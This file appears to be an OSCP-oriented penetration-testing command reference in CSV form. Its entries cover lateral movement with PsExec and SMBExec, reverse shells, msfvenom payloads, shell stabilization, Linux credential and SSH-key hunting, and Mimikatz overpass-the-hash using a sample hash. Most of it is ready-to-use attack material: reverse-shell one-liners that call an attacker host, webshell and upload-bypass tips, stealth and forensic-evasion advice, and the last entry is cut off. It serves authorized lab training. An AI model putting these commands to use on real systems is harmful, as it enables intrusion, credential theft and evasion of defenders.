"psexec-sysinternals","PSExec - Microsoft Sysinternals (Kerberos)","active-directory","PsExec64.exe -accepteula \\<TARGET> -u <DOMAIN>\<USER> -p <PASS> cmd","Execute Microsoft official PsExec64.exe from compromised Windows host (requires Kerberos authentication)","lateral-movement","OSCP TRAINING MATERIAL - PSEXEC FROM SYSINTERNALS SUITE:
TRAINING EXAMPLE:
From OSCP module, jen's credentials used from CLIENT74 to move laterally to FILES04:
'PS C:\Tools\SysinternalsSuite> .\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd'

Output confirmed successful lateral movement:
- PsExec v2.4 banner
- Interactive cmd.exe shell on FILES04
- 'whoami' returned 'corp\jen'
- 'hostname' returned 'FILES04'

THREE PREREQUISITES (CRITICAL - FROM TRAINING):
1.

User must be part of Administrators local group
2.

ADMIN$ share must be available  
3.

File and Printer Sharing has to be turned on

Training explicitly states:
""Luckily for us, the last two requirements are already met as they are the default settings on modern Windows Server systems.""

HOW PSEXEC WORKS (TECHNICAL BREAKDOWN FROM TRAINING):
1.

Writes psexesvc.exe into C:\Windows directory on target
2.

Creates and spawns a service on the remote host  
3.

Runs the requested program/command as a child process of psexesvc.exe

This is why you see 'Starting PSEXESVC service' in the output.

EXECUTION CONTEXT:
From training scenario:
- Attacker already had RDP access as offsec local admin on CLIENT74
- PsExec binary available at C:\Tools\SysinternalsSuite (full suite pre-installed)
- Executed 64-bit version (PsExec64.exe) for modern Windows targets
- Used -i flag for interactive session (spawns visible cmd.exe shell)

FLAG BREAKDOWN:
- -i:
Interactive mode (required for visible shell in training example)
- \\FILES04:
Target server (double backslash UNC path syntax)
- -u corp\jen:
Domain\username format (jen is domain user + local admin on FILES04)
- -p Nexus123!:
Password in plaintext
- cmd:
Command to execute (spawns interactive command shell)

SYSINTERNALS SUITE LOCATION IN OSCP LABS:
C:\Tools\SysinternalsSuite
- Full suite includes:
PsExec, PsInfo, PsKill, PsList, etc.
- Available on compromised Windows clients in OSCP environment
- No download needed - pre-staged in common locations

KERBEROS VS NTLM:
- Sysinternals PSExec uses Kerberos authentication (requires hostname or FQDN)
- Cannot use IP addresses directly (Kerberos requires SPN with hostname)
- Impacket PSExec uses NTLM (IP addresses work)

MICROSOFT LEGITIMACY:
- Signed by Microsoft Corporation
- Trusted by Windows Defender and enterprise AV
- Appears as legitimate admin tool in logs
- Whitelisted by default on most corporate systems

WHEN TO USE IN OSCP:
- Already pivoted to Windows client (CLIENT74, CLIENT76, etc.)
- Have domain credentials with local admin rights
- Target hostname known (not just IP)
- Want most reliable/stable lateral movement from Windows

COMPARISON - SYSINTERNALS VS IMPACKET PSEXEC:
- Sysinternals:
Windows→Windows, Kerberos, hostname required, Microsoft-signed
- Impacket:
Kali→Windows, NTLM, IP addresses work, Python-based

SERVICE CREATION (FORENSIC ARTIFACT):
- Event ID 7045:
Service installed (PSEXESVC)
- Service Name:
PSEXESVC
- Service File Name:
%SystemRoot%\PSEXESVC.exe
- Service Type:
User mode service
- Service Start Type:
Demand start

CLEANUP:
PSExec automatically removes PSEXESVC.exe and stops/deletes service on exit (clean disconnection).

TIME ESTIMATE:
2-3 minutes (including locating binary, command construction, execution).

EXAM STRATEGY:
Use Impacket PSExec from Kali for initial lateral movement.

Use Sysinternals PSExec when pivoting through compromised Windows clients with domain credentials.","high"
"psexec-sysinternals-interactive","PSExec - Interactive Desktop Session","active-directory","PsExec64.exe -accepteula \\<TARGET> -u <DOMAIN>\<USER> -p <PASS> -i <SESSION_ID> <COMMAND>","Launch interactive GUI application on remote system with visible desktop using PsExec -i flag","lateral-movement","EDUCATIONAL CONTEXT:
PSExec -i flag spawns process in user's interactive desktop session (Session 1+) instead of Session 0 (services).

WHY SESSION 0 vs SESSION 1+:
Windows services run in Session 0 (non-interactive, no GUI), user desktops run in Session 1+ (interactive).

DEFAULT BEHAVIOR:
Without -i, PSExec spawns in Session 0 - GUI apps invisible.

USE CASE:
Social engineering (spawn message to user), GUI tool demonstration, test interactive applications.

BEHIND THE SCENES:
-i flag tells PSEXESVC service to create process in specified session ID.

QUERY SESSIONS:
Use 'query user' or 'query session' to enumerate session IDs on target.

COMMON SESSION IDS:
Session 0 = services, Session 1 = first logged-on user, Session 2+ = additional users (RDP, fast user switching).

STEALTH:
Visible process to logged-in user - not stealthy.

TIME ESTIMATE:
3-5 minutes including session enumeration.

EXAM TIP:
Rarely needed for OSCP - use standard psexec for command execution.

Interactive mode more relevant for social engineering or GUI testing.","medium"
"smbexec-impacket-fileless","SMBExec - Impacket Fileless Shell","active-directory","impacket-smbexec <DOMAIN>/<USER>:<PASS>@<TARGET>","Semi-interactive shell via SMB using Impacket SMBExec - fileless alternative to PSExec (no binary written to disk)","lateral-movement","EDUCATIONAL CONTEXT:
SMBExec provides fileless lateral movement alternative to PSExec for maximum stealth and minimal forensic footprint.

HOW IT WORKS:
1) Creates temporary batch file in ADMIN$ share, 2) Executes batch file via service, 3) Batch file runs command and redirects output to temp file, 4) SMBExec retrieves output via SMB, 5) Deletes batch and output files.

FILELESS BENEFIT:
No persistent binary on disk (unlike PSExec which uploads RemCom.exe).

STEALTH:
Less detectable than PSExec - no binary signature, no service binary, only batch files (auto-deleted).

DISADVANTAGES:
Slower than PSExec (file creation/deletion per command), less stable for long sessions.

COMPARISON:
PSExec (fast, stable, binary on disk) vs SMBExec (slow, stealthy, fileless).

USE CASE:
Maximum stealth required, antivirus detection concern, forensic evasion.

SERVICE CREATION:
Still creates service for execution (Event ID 7045) but no persistent binary.

OUTPUT MODES:
-mode SHARE (default, uses ADMIN$) vs -mode SERVER (creates temp SMB server on Kali).

TIME ESTIMATE:
2-4 minutes for initial connection, slower per-command execution.

EXAM TIP:
Use SMBExec when PSExec detected/blocked by AV, or when stealth is priority over speed.","high"
"psexec-verify-firewall","PSExec - Verify File and Printer Sharing Ports","active-directory","sudo nmap -p 445,135 -Pn -sV -v <TARGET>","Verify required ports for PSExec are open (SMB 445 and RPC 135 for service creation)","lateral-movement","EDUCATIONAL CONTEXT:
PSExec requires both SMB (445) and RPC (135) ports - verify before attempting lateral movement to save time.

WHY BOTH PORTS:
Port 445 for ADMIN$ share access (binary upload), port 135 for service creation via RPC.

FIREWALL DEFAULTS:
Windows Server enables File and Printer Sharing by default, workstations often block it.

SERVICE DETECTION:
-sV flag identifies SMB version (SMBv1, SMBv2, SMBv3) - important for compatibility.

MANUAL ALTERNATIVE:
Test SMB manually:
smbclient -L //<TARGET> -U <USER>.

ALTERNATIVE PORTS:
If 445 blocked, PSExec won't work - use WinRM (5985) or WMI (135 only).

BEHIND THE SCENES:
nmap sends SYN packets to ports, analyzes responses, fingerprints services.

STEALTH:
This is enumeration - creates logs on target (connection attempts).

TIME ESTIMATE:
30 seconds to 1 minute for port scan.

EXAM TIP:
Always verify ports before exploitation attempts - prevents wasted time troubleshooting authentication when ports are blocked.","high"
"cme-smb-shares","CrackMapExec - Enumerate SMB Shares","active-directory","crackmapexec smb <TARGET> -u <USER> -p <PASS> --shares","Enumerate accessible SMB shares on target including ADMIN$, C$, IPC$ using CrackMapExec","lateral-movement","EDUCATIONAL CONTEXT:
Share enumeration confirms ADMIN$ accessibility - prerequisite for PSExec lateral movement.

WHY ADMIN$ MATTERS:
PSExec uploads binary to ADMIN$ share, creates service, executes payload.

PWNED INDICATOR:
[+] Pwn3d! confirms user has local administrator rights on target.

DEFAULT SHARES:
ADMIN$ (C:\Windows), C$ (C:\), IPC$ (inter-process communication), print$ (printer drivers).

CUSTOM SHARES:
Additional shares may contain sensitive data - enumerate contents.

PERMISSIONS:
READ,WRITE on ADMIN$ required for PSExec.

READ-only means user not admin.

ALTERNATIVE TOOLS:
smbclient -L //<TARGET> -U <USER> (manual), smbmap -u <USER> -p <PASS> -H <TARGET> (detailed permissions).

BEHIND THE SCENES:
Authenticates to IPC$ share, queries share list via SRVSVC RPC pipe.

TIME ESTIMATE:
<30 seconds for share enumeration.

EXAM TIP:
Always verify ADMIN$ accessible before attempting PSExec - saves time troubleshooting failed exploitation.","high"
"nc-listener-setup","Netcat Listener Setup","exploitation","nc -nlvp <LPORT>","Start a netcat listener to catch reverse shells","shells","Use port 443 to bypass egress filtering.

Always start listener BEFORE triggering reverse shell on target.","high"
"bash-reverse-shell","Bash Reverse Shell","exploitation","bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1","Establish reverse shell using bash built-in TCP socket","shells","Works on most Linux systems.

Firewall-friendly when using port 443/80.

URL-encode for web shells:
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<LHOST>%2F<LPORT>%200%3E%261%27","high"
"python-shell-upgrade","Python PTY Shell Upgrade","exploitation","python3 -c 'import pty;pty.spawn(""/bin/bash"")'","Upgrade dumb shell to interactive PTY shell with tab completion","shells","First step in shell stabilization.

Always upgrade shells immediately after catching them.

Python3 preferred but python2 works identically.

After upgrade, run:
export TERM=xterm","high"
"stty-shell-stabilization","STTY Shell Stabilization","exploitation","python3 -c 'import pty;pty.spawn(""/bin/bash"")' && export TERM=xterm && stty raw -echo; fg","Fully stabilize reverse shell with proper terminal settings (tab completion, CTRL+C, arrow keys)","shells","Full sequence:
1) python3 -c 'import pty;pty.spawn(""/bin/bash"")' 2) CTRL+Z 3) stty raw -echo; fg 4) export TERM=xterm 5) stty rows 38 cols 116 (match your terminal size with 'stty -a')","high"
"msfvenom-windows-reverse-tcp","Msfvenom Windows Reverse TCP Payload","exploitation","msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <OUTPUT_FILE>","Generate Windows reverse shell executable payload","shells","For 32-bit:
use 'windows/shell_reverse_tcp'.

For staged payload:
use 'windows/x64/shell/reverse_tcp'.

Common formats:
exe, dll, aspx, jsp, war.

Always test on similar system first.","high"
"msfvenom-linux-reverse-tcp","Msfvenom Linux Reverse TCP Payload","exploitation","msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o <OUTPUT_FILE>","Generate Linux reverse shell ELF binary","shells","For 32-bit:
use 'linux/x86/shell_reverse_tcp'.

After transfer:
chmod +x shell.elf && ./shell.elf.

Consider using bash/python one-liners instead if msfvenom binaries are detected.","high"
"msfvenom-php-webshell","Msfvenom PHP Web Shell","exploitation","msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw -o <OUTPUT_FILE>","Generate PHP reverse shell for web application exploitation","shells","Alternative:
PentestMonkey PHP reverse shell (more reliable).

Check disabled_functions in phpinfo() - may need to use alternative payload.

Common upload bypasses:
.phtml, .php5, .php3, .inc","high"
"msfvenom-aspx-webshell","Msfvenom ASPX Web Shell","exploitation","msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o <OUTPUT_FILE>","Generate ASP.NET reverse shell for IIS web application exploitation","shells","Works on IIS servers with ASP.NET enabled.

For ASP classic (older IIS):
use '-f asp' instead.

Test upload restrictions first.

Consider using cmd.aspx for simple command execution if reverse shell blocked.","high"
"netcat-reverse-shell-mkfifo","Netcat Reverse Shell (mkfifo)","exploitation","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f","Netcat reverse shell without -e flag using named pipes (FIFO)","shells","Works when netcat compiled without -e flag.

Named pipe creates bi-directional channel.

Alternative locations for pipe:
/dev/shm/f (tmpfs, no disk writes), /var/tmp/f (persistent across reboots).","high"
"python-reverse-shell","Python Reverse Shell","exploitation","python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""<LHOST>"",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'","Python-based reverse shell using socket and subprocess modules","shells","Works on most Linux systems.

More reliable than bash /dev/tcp method.

URL-encode for web shells.

Python2 version identical, just use 'python' instead of 'python3'.

One-liner format ideal for RCE exploitation.","high"
"perl-reverse-shell","Perl Reverse Shell","exploitation","perl -e 'use Socket;$i=""<LHOST>"";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'","Perl-based reverse shell using Socket module","shells","Perl is commonly installed on older Linux/Unix systems.

Less common than bash/python but useful when those aren't available.

One-liner format ideal for command injection.","medium"
"php-reverse-shell","PHP Reverse Shell","exploitation","php -r '$sock=fsockopen(""<LHOST>"",<LPORT>);exec(""/bin/sh -i <&3 >&3 2>&3"");'","PHP reverse shell one-liner using fsockopen","shells","Useful for PHP command injection or when you have PHP RCE.

Check disabled_functions with:
php -r 'print_r(ini_get(""disable_functions""));'.

Alternative functions:
system(), passthru(), shell_exec(), popen(), proc_open().","high"
"pty-spawn-script","Spawn PTY Shell with Script","exploitation","script /dev/null -c bash","Spawn a proper PTY shell using script command to enable job control, tab completion, and clear screen functionality","shell-utilities","CRITICAL OSCP TECHNIQUE: First step after gaining reverse shell.

WHY PTY shell matters:
(1) Job control - Ctrl+Z to background processes
(2) Tab completion - essential for enumeration
(3) Clear screen - Ctrl+L works
(4) Arrow keys - command history navigation
(5) Signal handling - Ctrl+C doesn't kill shell
(6) Interactive programs - su, sudo, ssh work properly

Full shell upgrade sequence:
1. Spawn PTY: script /dev/null -c bash
2. Background: Ctrl+Z
3. Raw mode: stty raw -echo; fg
4. Press Enter twice
5. Set terminal: export TERM=xterm
6. Set size: stty rows X cols Y

Alternatives if script not available:
- Python3: python3 -c 'import pty; pty.spawn(""/bin/bash"")'
- Python2: python -c 'import pty; pty.spawn(""/bin/bash"")'
- Perl: perl -e 'exec ""/bin/bash"";'
- socat (on target): socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:PORT

Manual verification:
Before upgrade: Ctrl+C kills shell, tab completion broken, clear fails
After upgrade: Full interactive shell with all features

OSCP exam tip: ALWAYS upgrade shell immediately after foothold. Practice the full sequence until muscle memory.

Time estimate: 30 seconds","high"
"revshells-payload-generate","Generate Reverse Shell Payload","exploitation","Visit https://www.revshells.com/ or use msfvenom","Generate reverse shell payloads for various languages and platforms using revshells.com online tool","shell-utilities","OSCP RESOURCE: https://www.revshells.com/ - Essential bookmark for exam.

Popular payload types:
(1) Bash TCP: bash -i >& /dev/tcp/LHOST/LPORT 0>&1
(2) Python3: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""LHOST"",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""]);'
(3) PHP: php -r '$sock=fsockopen(""LHOST"",LPORT);exec(""/bin/sh -i <&3 >&3 2>&3"");'
(4) Netcat: nc -e /bin/sh LHOST LPORT
(5) Socat: socat TCP:LHOST:LPORT EXEC:/bin/bash

URL encoding for web payloads:
Revshells.com provides URL-encoded versions automatically.

Manual generation with msfvenom:
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=9001 -f elf > shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=9001 -f exe > shell.exe
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=9001 -f raw > shell.php

OSCP workflow:
1. Start listener: nc -lvnp 9001
2. Generate payload with revshells.com (set LHOST, LPORT)
3. Execute payload on target (RCE, upload, injection)
4. Receive shell on listener
5. Upgrade to PTY immediately

OSCP exam tip: Pre-generate common payloads before exam. Save bash, Python, PHP templates with LHOST/LPORT placeholders.

Time estimate: 1-2 minutes (generation + execution)","high"
"linux-enumerate-users","Enumerate Linux Users","exploitation","cat /etc/passwd | grep -E '/bin/(bash|sh)' | cut -d: -f1","Enumerate valid user accounts on Linux system by filtering /etc/passwd for users with login shells","shell-utilities","CRITICAL OSCP ENUMERATION: Identify lateral movement and privilege escalation targets.

/etc/passwd format:
username:password:UID:GID:comment:home_directory:shell

Key observations:
(1) UID 0 = root (always present)
(2) UID 1000+ = regular users (target for lateral movement)
(3) UID < 1000 = system accounts (usually safe to ignore)
(4) Shell /bin/bash or /bin/sh = interactive login possible
(5) Shell /usr/sbin/nologin or /bin/false = service account, no login

Enumeration workflow:
1. List users with login shells (THIS COMMAND)
2. Check home directories: ls -la /home
3. Check sudo permissions: sudo -l
4. Read user-specific config: .bashrc, .bash_history, .ssh/

Manual verification:
For each user found:
- Home directory exists? ls -la /home/<username>
- SSH keys present? ls -la /home/<username>/.ssh/
- Bash history? cat /home/<username>/.bash_history
- Sudo access? sudo -l -U <username> (requires higher privs)

OSCP attack paths:
(1) Password reuse: Try found credentials on other users (su, SSH)
(2) Weak passwords: Generate wordlist from user info, crack with hydra/john
(3) SSH key theft: Copy id_rsa from .ssh/ directories
(4) Sudo exploitation: Check sudo permissions for each user

Alternative methods:
- getent passwd: Queries NSS databases (includes LDAP/NIS users)
- awk -F: '$3 >= 1000 {print $1}' /etc/passwd: Filter by UID threshold
- compgen -u: Bash built-in user listing (if available)

OSCP exam tip: Immediately enumerate users after shell upgrade. Document in enumeration.md. Check each user's home directory for credentials, SSH keys, scripts.

Time estimate: 30 seconds (command) + 5-10 minutes (home directory enumeration)","high"
"linux-enumerate-home-directory","Enumerate Linux Home Directories","exploitation","ls -la /home && for dir in /home/*; do echo ""\n=== $dir ===""; ls -la ""$dir"" 2>/dev/null; done","Enumerate all user home directories and their contents to discover credentials, SSH keys, scripts, and sensitive files","shell-utilities","HIGH-VALUE OSCP ENUMERATION: Home directories contain credentials, SSH keys, config files.

High-priority targets in home directories:
(1) .ssh/id_rsa - Private SSH keys for lateral movement
(2) .ssh/authorized_keys - Shows which keys can access this user
(3) .bash_history - Command history revealing passwords, IPs, attack vectors
(4) .bashrc, .profile - Environment variables, aliases (may contain credentials)
(5) credentials.txt, passwords.txt - Plain text credential files
(6) .mysql_history - Database query history (may expose passwords)
(7) .viminfo - Vim editor history (may show edited credential files)
(8) user.txt - OSCP user flag (proof of user-level access)
(9) Scripts (*.sh, *.py) - May contain hardcoded credentials
(10) Config files (.conf, .config/) - Application credentials

Enumeration workflow:
1. List all home directories (THIS COMMAND)
2. For each accessible directory:
   a. Check for .ssh/id_rsa: ls -la /home/user/.ssh/
   b. Read bash history: cat /home/user/.bash_history
   c. Search for passwords: grep -i password /home/user/*
   d. Find world-readable files: find /home/user -type f -readable
3. Document findings in enumeration.md

Manual verification:
For each user found:
ls -la /home/<username>/.ssh/
cat /home/<username>/.bash_history | grep -i 'password\|ssh\|sudo'
find /home/<username> -type f -readable 2>/dev/null | head -20

Common OSCP scenarios:
(1) SSH key theft: Copy id_rsa, chmod 600, ssh -i id_rsa user@target
(2) Password reuse: Credentials in history/scripts work for sudo/su/SSH
(3) Writable directories: Upload tools to writable home directories
(4) Backup files: .backup, .bak, .old files contain old credentials

Advanced searches:
# Find all SSH keys
find /home -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' 2>/dev/null

# Search for password strings
grep -r -i 'password\|passwd\|pwd' /home 2>/dev/null | head -50

# Find recently modified files (recent activity)
find /home -type f -mtime -7 -readable 2>/dev/null

# Find SUID binaries in home (unusual)
find /home -type f -perm -4000 -readable 2>/dev/null

OSCP exam tip: Enumerate home directories immediately after user enumeration. Focus on .ssh, .bash_history, and grep for 'password'. Document all findings even if not immediately useful.

Time estimate: 2-5 minutes (initial enum) + 10-20 minutes (deep dive)","high"
"linux-check-directory-permissions","Check Directory Permissions","exploitation","ls -la <DIRECTORY>","Check directory permissions, ownership, and contents to identify writable locations for privilege escalation or file upload","shell-utilities","CRITICAL OSCP SKILL: Identifying writable locations for privilege escalation.

Permission string format:
drwxrwxrwx
│└┬┘└┬┘└┬┘
│ │  │  └──> Other permissions (everyone else)
│ │  └─────> Group permissions
│ └────────> Owner permissions
└──────────> Type (d=directory, -=file, l=symlink)

Permission bits:
r (read) = 4    - Can list directory contents (ls)
w (write) = 2   - Can create/delete files in directory
x (execute) = 1 - Can cd into directory and access files

OSCP privilege escalation indicators:
(1) Writable web directory (drwxrwxrwx /var/www/html)
    → Upload webshell, achieve RCE

(2) Writable /etc (drwxrwxrwx /etc)
    → Modify /etc/passwd, /etc/shadow, /etc/sudoers

(3) Writable cron directories (drwxrwxrwx /etc/cron.d)
    → Add malicious cron job for root execution

(4) Writable script run by root (drwxrwxrwx /opt/scripts)
    → Modify script executed by root cron/systemd

(5) Writable home directory of other user
    → Plant SSH keys in .ssh/authorized_keys

(6) Writable /tmp, /var/tmp (always writable)
    → Upload and execute tools (linpeas, exploits)

Enumeration workflow:
1. Check current directory: ls -la .
2. Check web root: ls -la /var/www/html
3. Check /etc: ls -la /etc
4. Check /opt: ls -la /opt
5. Check home directories: ls -la /home/*
6. Find all writable directories:
   find / -type d -writable 2>/dev/null | grep -v '/proc\|/sys\|/run'

Manual verification:
To test if directory is writable:
touch <DIRECTORY>/testfile && rm <DIRECTORY>/testfile && echo ""Writable"" || echo ""Not writable""

Common OSCP targets:
/var/www/html - Web root (upload webshell)
/etc/cron.d - Cron jobs (add malicious job)
/opt - Third-party apps (modify scripts)
/tmp, /var/tmp - Temporary (always writable, upload tools)
/home/<user> - User home (SSH key injection)
/usr/local/bin - Local binaries (PATH hijacking)

Advanced permission checks:
# Check ACLs (extended permissions)
getfacl <DIRECTORY>

# Check SELinux context
ls -Z <DIRECTORY>

# Find SUID binaries in directory
find <DIRECTORY> -type f -perm -4000 2>/dev/null

# Recursive permission check
namei -l <DIRECTORY>/path/to/file

OSCP exam tip: Document all writable directories in enumeration.md. Check /var/www/html immediately (webshell upload). Test writable directories with touch command before wasting time.

Time estimate: 30 seconds per directory check","high"
"overpass-mimikatz-pth","Overpass-the-Hash - Mimikatz sekurlsa::pth","active-directory","mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:powershell","Convert NTLM hash to Kerberos TGT by creating process with hash then requesting Kerberos tickets","lateral-movement","OSCP TRAINING MATERIAL - OVERPASS-THE-HASH WITH MIMIKATZ:
TRAINING EXAMPLE (EXACT COMMAND FROM OSCP MODULE):
Scenario:
jen's credentials cached on CLIENT76 after running notepad as jen.

From CLIENT76 as jeff, performing overpass-the-hash:
```
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```

Result:
New PowerShell window opened in context of jen (with jen's credentials injected).

WHAT IS OVERPASS-THE-HASH:
Technique that converts NTLM hash into Kerberos Ticket Granting Ticket (TGT), enabling Kerberos authentication when you only have the NTLM hash.

Also called ""Pass-the-Key"".

WHY USE OVERPASS:
- Some tools REQUIRE Kerberos authentication (Sysinternals PsExec with Kerberos)
- Kerberos authentication is less logged/monitored than NTLM in some environments
- Avoids NTLM authentication over network (stealthier)
- Enables access to resources that only accept Kerberos

KEY DISTINCTION FROM PASS-THE-HASH:
- Pass-the-Hash (PTH):
Uses NTLM protocol directly with hash
- Overpass-the-Hash:
Converts NTLM hash → Kerberos TGT, then uses Kerberos protocol
- PTH:
Lateral movement via NTLM
- Overpass:
Lateral movement via Kerberos (requires TGT)

HOW OVERPASS-THE-HASH WORKS:
1.

Mimikatz sekurlsa::pth injects NTLM hash into LSASS process memory
2.

Creates new logon session with injected credentials
3.

Spawns specified program (/run:powershell) in new session context
4.

Program runs as original user (token) but has jen's credentials for network auth
5.

When Kerberos authentication triggered (net use, etc.), KDC uses injected hash for pre-authentication
6.

KDC issues TGT using hash (hash proves identity)
7.

TGT can then request service tickets (TGS) for lateral movement

TWO-STEP PROCESS (CRITICAL UNDERSTANDING):
Step 1:
sekurlsa::pth (injects credentials)
Step 2:
Trigger Kerberos authentication (net use, dir \\target, etc.) to generate TGT

sekurlsa::pth does NOT create TGT automatically - must trigger manually.

WHOAMI BEHAVIOR (FROM TRAINING):
After sekurlsa::pth, running whoami in new PowerShell shows ORIGINAL user (jeff), NOT impersonated user (jen).

Training explicitly states:
""Although jen is impersonated, the whoami command on this newly spawned PowerShell session shows the original user jeff.

This is the intended behavior.""

Why?
- whoami checks process token (shows jeff)
- Network authentication uses injected credentials (uses jen)
- Token impersonation vs credential injection are different mechanisms

Verify with klist (shows jen's Kerberos tickets), NOT whoami.

TRIGGERING KERBEROS AUTHENTICATION:
From training, after sekurlsa::pth, you must trigger Kerberos:
```powershell
PS C:\> net use \\files04
```

This command:
1.

Attempts to connect to files04 via SMB
2.

Triggers Kerberos authentication (because hostname used, not IP)
3.

KDC receives TGT request with jen's hash for pre-authentication
4.

KDC issues TGT for jen
5.

Client requests TGS for CIFS service on files04
6.

Connection succeeds using jen's Kerberos tickets

VERIFICATION:
From training, verify tickets created:
```powershell
PS C:\> klist
```

Output shows:
```
Client:
jen @ CORP.COM
Server:
krbtgt/CORP.COM @ CORP.COM
  KerbTicket Encryption Type:
AES-256-CTS-HMAC-SHA1-96
  Start Time:
<timestamp>
  End Time:
<timestamp>
  Renew Time:
<timestamp>
```

TGT confirmed (Server:
krbtgt).

Also shows TGS:
```
Server:
cifs/files04 @ CORP.COM
```

Service ticket for CIFS on files04.

LATERAL MOVEMENT:
From training, using Kerberos tickets for PsExec:
```powershell
PS C:\Tools\SysinternalsSuite> .\PsExec.exe \\files04 cmd
```

This succeeded because:
- PsExec detected Kerberos tickets in cache
- Used Kerberos authentication instead of NTLM
- jen's TGT valid for requesting service tickets
- Access granted to files04 as jen

PRE-AUTHENTICATION:
Kerberos pre-authentication uses password hash (NTLM or AES) to encrypt timestamp:
1.

Client requests TGT from KDC
2.

Client encrypts current timestamp with user's hash
3.

KDC decrypts with stored hash
4.

If decryption succeeds and timestamp valid, TGT issued

Overpass works because Mimikatz provides correct hash for encryption.

HASH SOURCES:
From training scenario, obtained hash via:
1.

jen ran notepad as herself on CLIENT76 (runas /user:jen notepad)
2.

Credentials cached in LSASS memory
3.

Mimikatz extracted:
sekurlsa::logonpasswords
4.

Output showed jen's NTLM hash:
369def79d8372408bf6e93364cc93075

Other sources:
- secretsdump.py (remote SAM/LSA dump)
- SAM database extraction
- LSA secrets
- NTDS.dit (domain controller database)

MANUAL ALTERNATIVE:
No direct manual alternative for overpass-the-hash:
- PowerShell cannot natively use hash for authentication
- Requires Mimikatz or Rubeus for hash-to-TGT conversion
- Normal flow requires plaintext password

Rubeus alternative:
```
Rubeus.exe asktgt /user:jen /domain:corp.com /rc4:369def79d8372408bf6e93364cc93075 /ptt
```
Single command vs Mimikatz multi-step.

DOMAIN REQUIREMENT:
- /domain must be FQDN:
corp.com not CORP
- Matches Kerberos realm name
- Case-insensitive but convention is lowercase

PORT REQUIREMENTS:
- TCP 88:
Kerberos (KDC communication for TGT/TGS requests)
- TCP/UDP 88:
Kerberos authentication
- No SMB/RPC required for TGT request (unlike Pass-the-Hash)

EXECUTION CONTEXT:
New PowerShell spawned:
- Process owner:
Original user (jeff) - visible in Task Manager
- Process token:
jeff's token
- Network credentials:
jen's credentials (injected)
- Kerberos tickets:
jen's TGT/TGS

This split allows:
- Local operations:
As jeff
- Network operations:
As jen

SECURITY CONTEXT:
From training scenario:
- jeff:
Local user on CLIENT76 (attacker's initial access)
- jen:
Domain user, local admin on FILES04 (target privilege level)
- Overpass allows jeff's session to network authenticate as jen
- jeff never obtains jen's actual privileges locally

TIME ESTIMATE:
- sekurlsa::pth execution:
10-20 seconds
- Trigger Kerberos (net use):
5-10 seconds
- Verification (klist):
5 seconds
- Total:
1-2 minutes

EXAM STRATEGY:
1.

Obtain NTLM hash via Mimikatz/secretsdump
2.

Use overpass-the-hash to convert to Kerberos TGT
3.

Trigger with net use \\target (hostname NOT IP)
4.

Verify with klist (look for TGT with Server:
krbtgt)
5.

Use Kerberos-enabled tools (PsExec, PowerShell remoting)
6.

Remember whoami shows original user - use klist to verify

WHEN TO USE OVERPASS:
- Target requires Kerberos (not NTLM)
- Want to avoid NTLM authentication logs
- Have hash but need Kerberos tickets
- Sysinternals PsExec scenario (prefers Kerberos over NTLM)

WHEN TO USE PASS-THE-HASH INSTEAD:
- Target accepts NTLM authentication
- Faster/simpler (no Kerberos setup)
- Impacket tools from Kali (PSExec, WMIExec, SMBExec)

COMMON FAILURES:
- No TGT generated:
Forgot to trigger Kerberos (net use)
- IP used instead of hostname:
Kerberos requires hostname for SPN
- Wrong domain format:
Use FQDN (corp.com not CORP)
- Time skew >5 minutes:
Synchronize clock with DC
- Hash invalid:
Verify extraction from sekurlsa::logonpasswords

FORENSIC ARTIFACTS:
- Event ID 4624:
Logon Type 9 (NewCredentials) when using /run
- Event ID 4768:
Kerberos TGT request (pre-authentication)
- Event ID 4769:
Kerberos TGS request (service ticket)
- Event ID 4648:
Explicit credential logon
- Mimikatz execution traces in memory/logs
- PowerShell spawned by mimikatz.exe (process tree)

KERBEROS TICKET LIFETIME:
Default:
- TGT:
10 hours
- TGS:
10 hours
- Renewable for 7 days

Check End Time in klist output.","high"
"overpass-net-use-trigger","Overpass-the-Hash - Trigger Kerberos TGT Request","active-directory","net use \\<TARGET>","Trigger Kerberos TGT/TGS generation after overpass-the-hash by accessing network resource","lateral-movement","OSCP TRAINING MATERIAL - TRIGGERING KERBEROS TGT AFTER OVERPASS-THE-HASH:
TRAINING EXAMPLE (FROM OSCP MODULE):
After performing sekurlsa::pth, training demonstrates triggering Kerberos:
```powershell
PS C:\Tools> net use \\files04
The command completed successfully.
```

Then verify tickets:
```powershell
PS C:\Tools> klist
```

Output shows:
```
Current LogonId is 0:0x11e387b

Cached Tickets:
(2)

#0>     Client:
jen @ CORP.COM
        Server:
